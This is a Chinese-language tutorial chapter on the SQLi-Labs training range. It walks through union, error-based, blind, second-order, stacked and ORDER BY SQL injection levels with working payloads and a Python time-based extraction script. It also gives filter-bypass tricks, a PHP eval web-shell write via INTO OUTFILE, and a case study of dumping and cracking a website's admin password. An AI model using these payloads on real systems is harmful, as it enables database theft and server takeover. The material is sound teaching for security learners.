---
outline: deep
---

# 靶场2：SQLi-Labs SQL注入专项靶场

> **难度等级：🟡 中等**
>
> **预计学习时间：180分钟**

---

## 📖 本章概述

::: tip 本章内容
SQLi-Labs是一个专门用于练习SQL注入的靶场，包含80多个关卡，涵盖了各种类型和场景的SQL注入。从最基础的GET注入到高级的WAF绕过，从MySQL到MSSQL再到Oracle，应有尽有。本章将带你深入学习SQL注入的各种技巧，通过10个经典关卡的详细解析，掌握SQL注入的核心原理和利用方法。
:::

> 💡 **大白话说SQLi-Labs——SQL注入的"九九八十一难"**
>
> SQLi-Labs有80多关，是不是很吓人？其实不用慌。
>
> 它就像《西游记》里的九九八十一难，看起来多，但可以分组来看：
> - **前10关**：GET注入基础——"走路"（最基本的SQL注入）
> - **11-22关**：POST注入——"跑步"（换种传参方式）
> - **23-38关**：各种绕过——"跨栏"（过滤、WAF绕过）
> - **39-65关**：堆叠注入等高级技巧——"飞檐走壁"
>
> 你不需要80关全打完。**如果能手工通关前20关**，你对SQL注入的理解就已经超过90%的Web安全学习者了。
>
> 关键不是打完多少关，而是**告别sqlmap**——先从手工开始，理解每一行Payload是怎么构造出来的。这才是本章的价值。

---

## 🎯 学习目标

学完本章，你将能够：

- [ ] 了解SQLi-Labs靶场的特点和关卡分类
- [ ] 独立完成SQLi-Labs环境搭建
- [ ] 掌握SQL注入的各种类型和利用方法
- [ ] 能够手工完成基础注入、报错注入、盲注
- [ ] 掌握堆叠注入、二次注入等高级注入技巧
- [ ] 学会编写自动化注入脚本
- [ ] 了解WAF绕过的基本方法

---

## 🔍 正文内容

### 1. SQLi-Labs介绍

#### 1.1 什么是SQLi-Labs？

**SQLi-Labs** 是由印度安全研究者 **Audi-1** 开发的一套专门用于学习SQL注入的靶场系统。它包含了80多个不同类型的SQL注入关卡，从基础到高级，层层递进，是学习SQL注入的最佳实践平台。

**官方GitHub**：https://github.com/Audi-1/sqli-labs

#### 1.2 靶场特点

| 特点 | 说明 |
|------|------|
| **关卡丰富** | 80+关卡，覆盖几乎所有SQL注入类型 |
| **循序渐进** | 从简单到复杂，适合各阶段学习者 |
| **多数据库** | 主要是MySQL，也涉及MSSQL、Oracle |
| **源码可读** | 每个关卡都有对应的PHP源码，可以学习漏洞成因 |
| **提示系统** | 每个关卡都有提示信息，卡住时可以参考 |
| **实战导向** | 模拟真实场景中的注入点和绕过方式 |

#### 1.3 适用人群

- 想要系统学习SQL注入的安全爱好者
- 准备CTF比赛的选手（Web方向）
- 渗透测试工程师
- Web开发者（学习防御SQL注入）
- 已经学过DVWA，想要深入的学习者

---

### 2. 环境搭建

#### 2.1 Docker方式（推荐）

```bash
# 搜索SQLi-Labs镜像
docker search sqli-labs

# 拉取镜像（以acgpiano/sqli-labs为例）
docker pull acgpiano/sqli-labs

# 运行容器
docker run -d -p 8080:80 --name sqli-labs acgpiano/sqli-labs

# 访问
# 浏览器打开 http://localhost:8080
# 点击 Setup/reset the DataBase 初始化数据库
```

#### 2.2 源码部署方式

**环境要求**：
- PHP 5.x 或 7.x
- MySQL 5.x 或 MariaDB
- Apache/Nginx

**安装步骤**：

```bash
# 1. 下载源码
git clone https://github.com/Audi-1/sqli-labs.git
cd sqli-labs

# 2. 修改数据库配置
# 编辑 sql-connections/db-creds.inc
<?php
$dbuser ='root';
$dbpass ='your_password';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>

# 3. 将源码放到Web根目录
# 例如：/var/www/html/sqli-labs/

# 4. 访问初始化页面
# http://localhost/sqli-labs/
# 点击 Setup/reset the DataBase for labs
```

---

### 3. 关卡分类

SQLi-Labs的80多个关卡可以分为以下几大类：

#### 3.1 基础注入（Less-1 ~ Less-20）

| 关卡范围 | 类型 | 说明 |
|---------|------|------|
| Less-1 ~ Less-4 | 基础GET注入 | 单引号、数字型、双引号、括号注入 |
| Less-5 ~ Less-7 | 报错注入 / 文件写入 | 双查询注入、写入文件 |
| Less-8 ~ Less-10 | 盲注 | 布尔盲注、时间盲注 |
| Less-11 ~ Less-12 | POST注入 | 单引号、双引号POST注入 |
| Less-13 ~ Less-14 | POST报错注入 | 基于报错的POST注入 |
| Less-15 ~ Less-16 | POST盲注 | 基于时间/布尔的POST盲注 |
| Less-17 ~ Less-18 | 更新查询注入 / Header注入 | UPDATE注入、User-Agent注入 |
| Less-19 ~ Less-20 | Referer注入 / Cookie注入 | Header头注入 |

#### 3.2 进阶注入（Less-21 ~ Less-40）

| 关卡范围 | 类型 | 说明 |
|---------|------|------|
| Less-21 ~ Less-22 | Cookie注入 | Base64编码、双引号注入 |
| Less-23 ~ Less-25 | 过滤绕过 | 注释符绕过、大小写绕过 |
| Less-26 ~ Less-28 | 空格绕过 | 空格、关键字过滤绕过 |
| Less-29 ~ Less-31 | WAF绕过 | 模拟WAF环境的注入 |
| Less-32 ~ Less-37 | 宽字节注入 | GBK编码绕过 |
| Less-38 ~ Less-40 | 堆叠注入 | 多条SQL语句执行 |

#### 3.3 高级注入（Less-41 ~ Less-65）

| 关卡范围 | 类型 | 说明 |
|---------|------|------|
| Less-41 ~ Less-45 | ORDER BY注入 | 排序注入、堆叠注入 |
| Less-46 ~ Less-53 | 其他注入点 | 各种特殊场景注入 |
| Less-54 ~ Less-65 | CTF挑战模式 | 限时、限制次数的挑战 |

#### 3.4 其他数据库和特殊场景（Less-66 ~ Less-80+）

- MSSQL注入
- Oracle注入
- 二次注入
- 各种绕过WAF的技巧

---

> 💡 **大白话说五种注入类型——别被名词吓到**
>
> 看完上面这么多关卡分类，头是不是已经晕了？其实SQL注入万变不离其宗，掌握这五种核心类型就够了：
>
> **1. 联合注入（Union注入）**：最直观。就像你在图书馆拿自己的借书证去借别人的书——本来你只能看到自己借的书，但你往查询条件里塞了 `UNION SELECT`，就像你说"我要看我的借书记录，再加上所有人的信用卡信息"——如果图书馆系统没做检查，就全给你了。
>
> **2. 报错注入**：网站"嘴不严"。就像你问前台："帮我查一下我的记录，但我把id写成一个计算式。"前台系统报错了，在错误信息里把数据库密码也显示出来了："错误：无法执行 calc(1/0)，数据库版本是 MySQL 8.0，当前用户是 root@localhost"——它自己全招了。
>
> **3. 布尔盲注**：网站不报错也不显示结果，但你能观察到"有无"的区别。就像你在密码锁上试密码，听锁芯的声音——试到对的字符时，锁芯转动的"咔哒"声比其他字符长一点。你就一个个字符试，最终拼出完整密码。
>
> **4. 时间盲注**：连"有无"的区别都不给。你就用 `SLEEP(5)` 让网站"睡"5秒。如果网站响应慢了5秒，说明你的注入生效了。就像你在考场外按汽车喇叭——如果监考老师5秒后从窗户探头骂你，说明你按对了车。
>
> **5. 堆叠注入**：在一条SQL语句后面跟另一条SQL。就像你给快递员说："把这个包裹送给张三（正常的SQL），然后把所有包裹都寄给我（你的恶意SQL）"——如果快递公司允许你一次性下达多条指令，你就控制了整个仓库。
>
> **学习建议**：先搞懂联合注入（Less-1~4），然后攻破报错注入（Less-5~7），最后用盲注（Less-8~10）检测你的理解深度。这三类搞定，后面的绕过、WAF都是换汤不换药。

### 4. 重点关卡详解

#### 4.1 Less-1：基于错误的GET单引号字符型注入

**关卡地址**：`/Less-1/`
**注入点**：GET参数 `id`
**注入类型**：字符型注入（单引号）
**难度**：⭐ 入门级

##### 源码分析

```php
<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if($row) {
    echo 'Your Login name:'. $row['username'];
    echo 'Your Password:' .$row['password'];
} else {
    print_r(mysql_error());
}
?>
```

**关键分析**：
- id参数直接拼接到SQL语句中，用单引号包裹
- 报错信息直接输出，适合基于错误的注入
- 有LIMIT限制，但可以用注释符绕过

##### 注入思路

1. 测试注入点：`?id=1'` → 报错，确认存在注入
2. 判断字段数：`?id=1' order by 3 --+` → 正常；`?id=1' order by 4 --+` → 报错，共3个字段
3. 联合查询：`?id=-1' union select 1,2,3 --+` → 显示位为第2、3位
4. 脱库

##### 利用步骤

```
# 1. 确认注入点
?id=1' AND '1'='1       → 正常
?id=1' AND '1'='2       → 异常

# 2. 猜解字段数
?id=1' order by 3 --+   → 正常（3个字段）
?id=1' order by 4 --+   → 报错

# 3. 联合查询获取显示位
?id=-1' union select 1,2,3 --+

# 4. 获取数据库名和版本
?id=-1' union select 1, database(), version() --+
# 数据库名：security
# 版本：5.x（有information_schema）

# 5. 获取所有表名
?id=-1' union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema='security' --+
# 结果：emails, referers, uagents, users

# 6. 获取users表的列名
?id=-1' union select 1, group_concat(column_name), 3 from information_schema.columns where table_name='users' --+
# 结果：id, username, password

# 7. 导出数据
?id=-1' union select 1, group_concat(username,0x3a,password), 3 from users --+
# 结果：Dumb:Dumb, Angelina:I-kill-you, ...
```

##### SQL语句详解

```sql
-- 原始查询
SELECT * FROM users WHERE id='1' LIMIT 0,1

-- 注入后的查询（联合查询）
SELECT * FROM users WHERE id='-1' union select 1, database(), version() -- ' LIMIT 0,1

-- 解释：
-- 1. id=-1 让前面的查询返回空结果
-- 2. union select 将两个查询结果合并
-- 3. -- 是MySQL的行注释，注释掉后面的 LIMIT 0,1
-- 4. +号在URL中会被解码为空格
```

---

#### 4.2 Less-2：基于错误的GET数字型注入

**关卡地址**：`/Less-2/`
**注入点**：GET参数 `id`
**注入类型**：数字型注入
**难度**：⭐ 入门级

##### 源码分析

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result = mysql_query($sql);
// ...
?>
```

**关键分析**：
- id参数没有引号包裹，是数字型注入
- 其他和Less-1相同

##### 注入思路

数字型注入和字符型注入的区别在于不需要单引号闭合，直接注入即可。

##### 利用步骤

```
# 1. 确认注入点
?id=1 and 1=1   → 正常
?id=1 and 1=2   → 异常

# 2. 猜解字段数
?id=1 order by 3 --   → 正常
?id=1 order by 4 --   → 报错

# 3. 联合查询
?id=-1 union select 1,2,3 --

# 4. 脱库（同Less-1，只是去掉单引号）
?id=-1 union select 1, group_concat(username,0x3a,password), 3 from users --
```

##### SQL语句详解

```sql
-- 原始查询
SELECT * FROM users WHERE id=1 LIMIT 0,1

-- 注入后的查询
SELECT * FROM users WHERE id=-1 union select 1,2,3 -- LIMIT 0,1

-- 数字型注入不需要闭合单引号，比字符型更简单
```

---

#### 4.3 Less-5：双注入（报错注入）

**关卡地址**：`/Less-5/`
**注入点**：GET参数 `id`
**注入类型**：报错注入（双查询注入）
**难度**：⭐⭐ 基础级

##### 源码分析

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if($row) {
    echo 'You are in...........';
} else {
    print_r(mysql_error());
}
?>
```

**关键分析**：
- 查询结果只显示 "You are in..........."，不显示具体数据
- 但报错信息会完整输出
- 适合使用基于报错的注入方法

##### 注入思路

当页面不显示查询结果但显示错误信息时，可以使用报错注入。报错注入的原理是让SQL语句在执行过程中产生错误，并将我们想要的信息通过错误信息显示出来。

常用的报错注入函数：
- `updatexml()`
- `extractvalue()`
- `floor()` + `rand()` + `group by`（双查询注入）

##### 利用步骤

**方法一：updatexml报错注入**

```
# 1. 测试报错注入
?id=1' and updatexml(1, concat(0x7e, version()), 1) --+
# 报错：XPATH syntax error: '~5.5.44-0ubuntu0.14.04.1'

# 2. 获取数据库名
?id=1' and updatexml(1, concat(0x7e, database()), 1) --+
# 结果：security

# 3. 获取表名
?id=1' and updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security')), 1) --+
# 注意：updatexml最多显示32位，需要用substring或limit分次获取

# 4. 获取第一个表名
?id=1' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema='security' limit 0,1)), 1) --+

# 5. 获取列名
?id=1' and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)), 1) --+

# 6. 获取数据
?id=1' and updatexml(1, concat(0x7e, (select concat(username,0x3a,password) from users limit 0,1)), 1) --+
```

**方法二：extractvalue报错注入**

```
?id=1' and extractvalue(1, concat(0x7e, database(), 0x7e)) --+
```

**方法三：floor报错注入（双查询注入）**

```
?id=1' and (select 1 from (select count(*), concat(version(), floor(rand(0)*2))x from information_schema.tables group by x)a) --+
```

##### SQL语句详解

```sql
-- updatexml报错注入原理
SELECT * FROM users WHERE id='1' and updatexml(1, concat(0x7e, database()), 1) -- '

-- updatexml(xml_document, xpath_string, new_value)
-- 第二个参数要求是合法的XPath格式
-- 当我们传入~database()时，格式不正确就会报错
-- 报错信息中会包含我们构造的内容（即database()的结果）
```

---

#### 4.4 Less-8：布尔盲注

**关卡地址**：`/Less-8/`
**注入点**：GET参数 `id`
**注入类型**：布尔盲注
**难度**：⭐⭐ 基础级

##### 源码分析

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if($row) {
    echo '<font size="5" color="#FFFF00">';
    echo 'You are in...........';
    echo "</font>";
} else {
    echo '<font size="5" color="#FFFF00">';
    echo '</font>';
}
?>
```

**关键分析**：
- 没有任何报错信息
- 查询成功显示 "You are in..........."
- 查询失败什么都不显示
- 只能通过页面显示的真/假来判断注入结果

##### 注入思路

布尔盲注的核心是构造一个真/假的判断条件，通过页面的不同响应来逐位猜解数据。

基本方法：
1. 先猜解数据的长度
2. 再逐字符猜解内容
3. 使用ASCII码进行比较

##### 利用步骤

```
# 1. 确认注入点
?id=1' and 1=1 --+    → 显示 You are in...
?id=1' and 1=2 --+    → 不显示

# 2. 猜解数据库名长度
?id=1' and length(database())=8 --+   → 正常，说明长度是8

# 3. 逐字符猜解数据库名（ASCII码比较）
?id=1' and ascii(substr(database(),1,1))>97 --+   → 正常（大于a）
?id=1' and ascii(substr(database(),1,1))>115 --+   → 正常（大于s）
?id=1' and ascii(substr(database(),1,1))>116 --+   → 异常（不大于t）
# 所以第一个字符的ASCII码在115(s)和116(t)之间，即 's'

# 4. 猜解表的数量
?id=1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+

# 5. 猜解第一个表名长度
?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6 --+

# 6. 逐字符猜解表名
?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 --+
# 第一个字符：e (ASCII 101)
```

##### SQL语句详解

```sql
-- 布尔盲注的核心思路
SELECT * FROM users WHERE id='1' AND ascii(substr(database(),1,1)) = 115 -- '

-- 解释：
-- 1. substr(database(),1,1) 取出数据库名的第一个字符
-- 2. ascii() 将字符转换为ASCII码
-- 3. 比较ASCII码是否等于某个值
-- 4. 如果相等，页面正常显示；不相等则不显示
-- 5. 通过二分法快速缩小范围，猜解出每个字符
```

---

#### 4.5 Less-9：时间盲注

**关卡地址**：`/Less-9/`
**注入点**：GET参数 `id`
**注入类型**：时间盲注
**难度**：⭐⭐ 基础级

##### 源码分析

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$result = mysql_query($sql);
$row = mysql_fetch_array($result);
if($row) {
    echo 'You are in...........';
} else {
    echo 'You are in...........';
}
?>
```

**关键分析**：
- 无论查询成功还是失败，页面显示完全一样
- 没有报错信息
- 无法通过页面内容判断真假
- 只能通过响应时间的差异来判断

##### 注入思路

时间盲注利用 `sleep()` 或 `benchmark()` 函数，根据条件是否成立来控制响应时间。如果条件成立，则延迟响应；如果不成立，则立即响应。

##### 利用步骤

```
# 1. 测试时间盲注
?id=1' and sleep(5) --+
# 如果页面延迟了5秒才返回，说明存在时间盲注

# 2. 猜解数据库名长度
?id=1' and if(length(database())=8, sleep(5), 1) --+
# 如果延迟5秒，说明长度是8

# 3. 逐字符猜解数据库名
?id=1' and if(ascii(substr(database(),1,1))=115, sleep(5), 1) --+
# 第一个字符是 's' (ASCII 115)

# 4. 猜解表名
?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101, sleep(5), 1) --+

# 5. 猜解数据
?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68, sleep(5), 1) --+
```

##### 自动化脚本（Python）

```python
import requests
import time

url = "http://localhost/sqli-labs/Less-9/"

def get_length():
    """获取数据库名长度"""
    for length in range(1, 30):
        payload = f"1' and if(length(database())={length}, sleep(3), 1) --+"
        start_time = time.time()
        r = requests.get(url, params={"id": payload})
        end_time = time.time()
        if end_time - start_time > 2.5:  # 延迟超过2.5秒
            return length
    return 0

def get_db_name(length):
    """逐字符猜解数据库名"""
    db_name = ""
    for i in range(1, length + 1):
        for ascii_val in range(32, 127):
            payload = f"1' and if(ascii(substr(database(),{i},1))={ascii_val}, sleep(3), 1) --+"
            start_time = time.time()
            r = requests.get(url, params={"id": payload})
            end_time = time.time()
            if end_time - start_time > 2.5:
                db_name += chr(ascii_val)
                print(f"[+] {db_name}")
                break
    return db_name

if __name__ == "__main__":
    length = get_length()
    print(f"[*] Database length: {length}")
    db_name = get_db_name(length)
    print(f"[+] Database name: {db_name}")
```

##### SQL语句详解

```sql
-- 时间盲注的核心
SELECT * FROM users WHERE id='1' AND IF(condition, sleep(5), 1) -- '

-- IF(condition, true_value, false_value)
-- 如果条件成立，执行sleep(5)，延迟5秒
-- 如果条件不成立，立即返回
-- 通过响应时间判断条件是否成立
```

---

#### 4.6 Less-11：POST注入

**关卡地址**：`/Less-11/`
**注入点**：POST参数 `uname` 和 `passwd`
**注入类型**：POST注入（单引号）
**难度**：⭐ 入门级

##### 源码分析

```php
<?php
if(isset($_POST['uname']) && isset($_POST['passwd'])) {
    $uname = $_POST['uname'];
    $passwd = $_POST['passwd'];
    $query = "SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
    $result = mysql_query($query);
    $row = mysql_fetch_array($result);
    if($row) {
        echo 'Login Successful';
    } else {
        echo 'Login Failed';
        print_r(mysql_error());
    }
}
?>
```

**关键分析**：
- 注入点在POST参数中
- 用户名和密码都可能存在注入
- 有报错信息

##### 注入思路

POST注入和GET注入原理相同，只是参数传递方式不同。需要用Burp Suite或Python脚本发送POST请求。

##### 利用步骤

**方法一：使用Burp Suite**
1. 在登录框随便输入账号密码
2. 用Burp拦截请求，发送到Repeater
3. 修改uname参数进行注入测试

**方法二：手动构造POST请求**

```
# 在uname参数中注入
uname=admin' -- &passwd=anything
# 登录成功，注释掉了密码验证

# 联合查询（需要判断字段数）
uname=' union select 1,2 -- &passwd=
# 显示位：2个字段

# 获取数据库名
uname=' union select 1, database() -- &passwd=
```

**使用sqlmap**：
```bash
# 从文件读取POST请求
sqlmap -r post.txt -p uname

# 或直接指定POST数据
sqlmap -u "http://localhost/sqli-labs/Less-11/" --data "uname=admin&passwd=admin" -p uname
```

---

#### 4.7 Less-17：更新查询注入

**关卡地址**：`/Less-17/`
**注入点**：POST参数 `uname` 和 `passwd`
**注入类型**：UPDATE语句注入（报错注入）
**难度**：⭐⭐⭐ 进阶级

##### 源码分析

```php
<?php
if(isset($_POST['uname']) && isset($_POST['passwd'])) {
    $uname = check_input($_POST['uname']);
    $passwd = $_POST['passwd'];
    
    $row = mysql_fetch_array(mysql_query("SELECT username FROM users WHERE username='$uname'"));
    
    if($row) {
        $update = "UPDATE users SET password='$passwd' WHERE username='$uname'";
        $result = mysql_query($update);
        if($result) {
            echo 'Password Changed';
        } else {
            print_r(mysql_error());
        }
    }
}

function check_input($value) {
    if(!empty($value)) {
        $value = substr($value, 0, 15);
        $value = mysql_real_escape_string($value);
    }
    return $value;
}
?>
```

**关键分析**：
- 用户名经过了check_input函数过滤（长度限制+转义）
- 密码参数直接拼接到UPDATE语句中
- 有报错信息输出
- 注入点在password参数的UPDATE语句中
- 适合使用报错注入

##### 注入思路

UPDATE语句的注入和SELECT类似，但需要注意语法。因为是更新操作，我们主要使用报错注入来获取信息。

##### 利用步骤

```
# 1. 确认注入点
uname=admin&passwd='   → 报错
uname=admin&passwd=1' and '1'='1  → 正常更新

# 2. 使用updatexml报错注入
uname=admin&passwd=' and updatexml(1, concat(0x7e, database()), 1) #
# 报错信息中包含数据库名

# 3. 获取表名
uname=admin&passwd=' and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1)), 1) #

# 4. 获取列名
uname=admin&passwd=' and updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)), 1) #

# 5. 获取数据（注意：不能直接查询当前正在更新的表，需要用子查询绕过）
uname=admin&passwd=' and updatexml(1, concat(0x7e, (select password from (select password from users where username='admin')a)), 1) #
```

##### SQL语句详解

```sql
-- 原始UPDATE语句
UPDATE users SET password='$passwd' WHERE username='$uname'

-- 注入后的语句
UPDATE users SET password='' AND updatexml(1, concat(0x7e, database()), 1) #' WHERE username='admin'

-- 注意：
-- 1. UPDATE语句中也可以使用报错注入函数
-- 2. 要注意引号的闭合
-- 3. # 是MySQL的另一种注释方式
-- 4. 直接查询当前表会报错，需要嵌套子查询
```

---

#### 4.8 Less-24：二次注入

**关卡地址**：`/Less-24/`
**注入点**：注册功能（存储到数据库）→ 修改密码（从数据库读取）
**注入类型**：二次注入
**难度**：⭐⭐⭐ 进阶级

##### 源码分析

**注册页面（new_user.php）**：
```php
$username = mysql_real_escape_string($_POST['username']);
$pass = mysql_real_escape_string($_POST['password']);
$sql = "insert into users (username, password) values ('$username', '$pass')";
```
注册时使用了mysql_real_escape_string转义，看似安全。

**修改密码页面（pass_change.php）**：
```php
$username = $_SESSION["username"];
$curr_pass = mysql_real_escape_string($_POST['current_password']);
$pass = mysql_real_escape_string($_POST['password']);
$pass2 = mysql_real_escape_string($_POST['confirm_password']);

$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
```
修改密码时，用户名从Session中取出，直接拼接到SQL语句中，没有转义。

**关键分析**：
- 注册时虽然转义了，但数据存入数据库时会还原（去掉转义符）
- 修改密码时从Session（数据库）读取用户名，直接使用
- 恶意的SQL语句被存储在数据库中，在后续操作中被执行
- 这就是"二次注入"：第一次输入被转义存储，第二次读取时造成注入

##### 注入思路

1. 注册一个特殊的用户名，包含注入语句
2. 登录这个账号
3. 修改密码，触发二次注入
4. 利用注入语句修改管理员密码

##### 利用步骤

```
# 1. 注册用户
用户名：admin' #
密码：123456

# 2. 登录 admin' #

# 3. 修改密码
新密码：hacked

# 此时执行的SQL语句是：
# UPDATE users SET PASSWORD='hacked' where username='admin' #' and password='...'

# 解释：
# username = "admin' #"
# SQL变为：WHERE username='admin' #' AND ...
# # 注释掉了后面的密码验证
# 实际执行的是：修改admin用户的密码为hacked

# 4. 用admin/hacked登录
# 成功登录管理员账号
```

##### 二次注入原理图解

```
┌─────────────┐    转义存储    ┌─────────────┐    读取拼接    ┌─────────────┐
│  输入: admin'│ ────────────→ │  数据库存储  │ ────────────→ │  SQL注入执行  │
│      #      │                │  admin' #   │                │  造成注入   │
└─────────────┘                └─────────────┘                └─────────────┘
        ↑                              ↑                               ↑
   第一次输入                    转义后存入数据库                 二次利用造成注入
```

---

#### 4.9 Less-38：堆叠注入

**关卡地址**：`/Less-38/`
**注入点**：GET参数 `id`
**注入类型**：堆叠注入（Stacked Queries）
**难度**：⭐⭐⭐ 进阶级

##### 源码分析

```php
<?php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
$multi_query = mysqli_multi_query($con1, $sql);
if($multi_query) {
    if ($result = mysqli_store_result($con1)) {
        while ($row = mysqli_fetch_row($result)) {
            echo 'Your Login name:'. $row[1];
            echo 'Your Password:' .$row[2];
        }
    }
}
?>
```

**关键分析**：
- 使用了 `mysqli_multi_query()` 函数
- 该函数支持一次执行多条SQL语句，用分号分隔
- 这就是堆叠注入的条件
- 可以执行INSERT、UPDATE、DELETE、DROP等任意语句

##### 注入思路

堆叠注入可以在原有查询后追加任意SQL语句，用分号分隔。这比普通的UNION注入更强大，因为可以执行写操作。

##### 利用步骤

```
# 1. 确认堆叠注入
?id=1'; select 1,2,3 --+
# 正常显示，说明支持堆叠查询

# 2. 创建新表
?id=1'; create table test like users --+

# 3. 插入管理员数据
?id=1'; insert into test(id, username, password) values (99, 'hacker', 'hacked') --+

# 4. 修改管理员密码
?id=1'; update users set password='hacked' where username='admin' --+

# 5. 删除表
?id=1'; drop table test --+

# 6. 添加新用户（需要FILE权限）
?id=1'; create user 'hacker'@'localhost' identified by '123456' --+
?id=1'; grant all privileges on *.* to 'hacker'@'localhost' --+

# 7. 写入文件（需要FILE权限）
?id=1'; select '<?php eval($_POST[x]);?>' into outfile '/var/www/html/shell.php' --+
```

##### SQL语句详解

```sql
-- 原始查询
SELECT * FROM users WHERE id='$id' LIMIT 0,1

-- 堆叠注入后
SELECT * FROM users WHERE id='1'; update users set password='hacked' where username='admin' -- ' LIMIT 0,1

-- 执行了两条语句：
-- 1. SELECT * FROM users WHERE id='1'
-- 2. update users set password='hacked' where username='admin'

-- 注意：
-- 堆叠注入需要数据库驱动支持多条语句执行
-- PHP中mysql_query()不支持，mysqli_multi_query()支持
-- PDO默认不支持，需要设置PDO::ATTR_EMULATE_PREPARES
```

---

#### 4.10 Less-46：ORDER BY注入

**关卡地址**：`/Less-46/`
**注入点**：GET参数 `sort`
**注入类型**：ORDER BY注入
**难度**：⭐⭐⭐ 进阶级

##### 源码分析

```php
<?php
$id = $_GET['sort'];
$sql = "SELECT * FROM users ORDER BY $id";
$result = mysql_query($sql);
if($result) {
    // 输出表格
} else {
    echo mysql_error();
}
?>
```

**关键分析**：
- 注入点在ORDER BY子句中
- ORDER BY后面的参数不能用引号包裹
- UNION注入在这里不适用（语法不对）
- 需要使用其他方法：报错注入、盲注、时间盲注

##### 注入思路

ORDER BY注入的特点：
- 可以控制排序的字段或方向
- 可以使用IF、CASE等条件语句
- 可以基于报错、时间盲注等方式获取数据

##### 利用步骤

**方法一：报错注入**

```
?sort=updatexml(1, concat(0x7e, database()), 1)
# 报错，获取数据库名
```

**方法二：布尔盲注（基于排序结果）**

```
# 判断数据库名第一个字符
?sort=if(ascii(substr(database(),1,1))=115, id, username)
# 如果第一个字符是's'，按id排序；否则按username排序
# 通过观察排序结果来判断
```

**方法三：时间盲注**

```
?sort=if(ascii(substr(database(),1,1))=115, sleep(5), 1)
# 如果条件成立，延迟5秒
```

**方法四：PROCEDURE ANALYSE 报错**

```
?sort=1 procedure analyse(extractvalue(1, concat(0x7e, version())), 1)
```

##### SQL语句详解

```sql
-- ORDER BY注入的核心
SELECT * FROM users ORDER BY IF(condition, id, username)

-- 如果条件为真，按id排序
-- 如果条件为假，按username排序
-- 通过观察排序结果判断条件是否成立
-- 也可以使用报错注入和时间盲注
```

---

### 5. SQL注入绕过技巧

#### 5.1 空格绕过

当空格被过滤时，可以使用以下方法代替空格：

```sql
-- 使用注释符
select/**/1,2,3

-- 使用括号
select(1),(2),(3)

-- 使用制表符、换行符
%09, %0a, %0b, %0c, %0d

-- 使用反引号
select`id`from`users`

-- 使用+号（需要特定环境）
?id=1'and+1=2+union+select+1,2,3--+
```

#### 5.2 注释符绕过

当 `--` 和 `#` 被过滤时：

```sql
-- 闭合引号（不需要注释）
?id=1' and '1'='1

-- 使用内联注释
/*!50000select*/ 1,2,3

-- 利用引号闭合
?id=1' union select 1,2,3 and '1'='1
```

#### 5.3 关键字绕过

当关键字如 select、union、where 等被过滤时：

```sql
-- 大小写绕过（不区分大小写的数据库）
SeLeCt 1,2,3
UNIOn SELect 1,2,3

-- 双写绕过（只过滤一次时）
selselectect → 过滤一次后变成 select
uniunionon → 过滤一次后变成 union

-- 编码绕过
URL编码、Unicode编码、十六进制编码

-- 使用等价函数/语法
like 代替 =
ascii(substr(...)) 代替 mid()
```

#### 5.4 引号绕过

当单引号被过滤或转义时：

```sql
-- 使用十六进制
select * from users where username = 0x61646d696e
-- 0x61646d696e 是 admin 的十六进制

-- 使用CHAR函数
char(97,100,109,105,110) = 'admin'

-- 宽字节注入（GBK编码）
?id=1%df' union select 1,2,3--+
```

#### 5.5 等号绕过

```sql
-- 使用LIKE
select * from users where username like 'admin'

-- 使用REGEXP
select * from users where username regexp '^admin$'

-- 使用大于小于号
select * from users where ascii(substr(username,1,1)) > 96
```

---

## 📚 案例讲解

### 案例1：手工注入实战 - 从入门到脱库

**场景**：你在测试一个新闻网站，发现新闻详情页的id参数可能存在SQL注入。

**目标**：手工完成注入，获取管理员账号密码。

**步骤**：

1. **探测注入点**
   - 访问 `?id=1` → 正常显示新闻
   - 访问 `?id=1'` → 报错 "You have an error in your SQL syntax"
   - 确认存在字符型SQL注入

2. **判断字段数**
   - `?id=1' order by 1 --+` → 正常
   - `?id=1' order by 2 --+` → 正常
   - `?id=1' order by 3 --+` → 正常
   - `?id=1' order by 4 --+` → 报错
   - 结论：共3个字段

3. **获取显示位**
   - `?id=-1' union select 1,2,3 --+`
   - 页面显示：标题位置显示2，内容位置显示3
   - 结论：第2、3位是显示位

4. **获取数据库信息**
   - 数据库名：`?id=-1' union select 1, database(), version() --+`
   - 结果：news_db / MySQL 5.7.26

5. **获取表名**
   - `?id=-1' union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema='news_db' --+`
   - 结果：news, admin_user, category, comment

6. **获取管理员表的列名**
   - `?id=-1' union select 1, group_concat(column_name), 3 from information_schema.columns where table_name='admin_user' --+`
   - 结果：id, username, password, role

7. **导出管理员数据**
   - `?id=-1' union select 1, username, password from admin_user --+`
   - 结果：admin / e10adc3949ba59abbe56e057f20f883e (MD5)
   - MD5解密：admin / 123456

8. **登录后台**
   - 找到后台地址：/admin/login.php
   - 使用 admin / 123456 登录
